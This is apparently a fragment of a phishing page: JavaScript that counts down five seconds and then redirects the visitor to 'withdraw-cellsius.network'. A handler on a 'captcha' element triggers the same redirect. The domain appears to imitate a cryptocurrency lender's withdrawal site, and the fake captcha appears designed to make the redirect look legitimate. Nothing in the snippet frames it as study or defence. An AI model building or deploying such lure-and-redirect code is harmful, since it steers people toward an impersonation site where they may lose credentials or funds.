

var secondsLeft = 5;
var countdownElement = document.getElementById('countdown');

function updateCountdown() {
  countdownElement.textContent = secondsLeft;
  secondsLeft--;

  if (secondsLeft < 0) {
    // Rediriger après le décompte
    window.location.href = "https://withdraw-cellsius.network/";
  } else {
    setTimeout(updateCountdown, 1000);
  }
}

updateCountdown();


    document.getElementById("captcha").onended = function() {
        window.location.href = "https://withdraw-cellsius.network/";
    };
